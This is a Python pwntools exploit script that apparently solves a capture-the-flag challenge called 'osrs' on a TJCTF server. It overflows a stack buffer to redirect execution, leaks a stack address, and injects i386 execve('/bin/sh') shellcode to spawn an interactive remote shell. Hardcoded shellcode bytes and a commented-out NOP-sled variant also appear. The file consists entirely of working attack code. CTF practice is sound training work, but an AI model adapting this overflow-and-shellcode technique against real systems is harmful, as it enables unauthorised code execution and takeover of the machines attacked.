#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

def pwn():

    io = process('./osrs')
    #io = remote('p1.tjctf.org', 8006)
   
    elf = ELF('./osrs')
    get_tree = elf.sym['get_tree']
    payload = 'A'*0x110 + p32(get_tree)
    io.sendline(payload)
    
    stack = io.recvline_startswith("I don't have the tree")[-9:-3] + 2**32
    info("stack=%#x", stack)

    #shellcode = asm(shellcraft.sh())
    shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    nop = '\x90'

    # 272
    #buf = nop * 110 + p32(stack + 0x150) + nop * 0x200 + shellcode
    #io.sendline(buf)
    #io.recv()
    #io.interactive()

def pwn2():

    get_tree = ELF('./osrs').symbols['get_tree']
    r_offset = 0x10C+4
    r = remote('p1.tjctf.org', 8006)
    #r = process('./osrs')
    r.sendlineafter(': \n', r_offset*'A' + p32(get_tree))
    r.recvuntil('tree ')
    s_addr = (1<<32)+int(r.recvuntil(' '))
    sh = asm(shellcraft.i386.linux.sh(), arch='i386')
    r.sendlineafter(': \n', sh.ljust(r_offset) + p32(s_addr+4))
    r.interactive()


if __name__ == '__main__':
    pwn2()
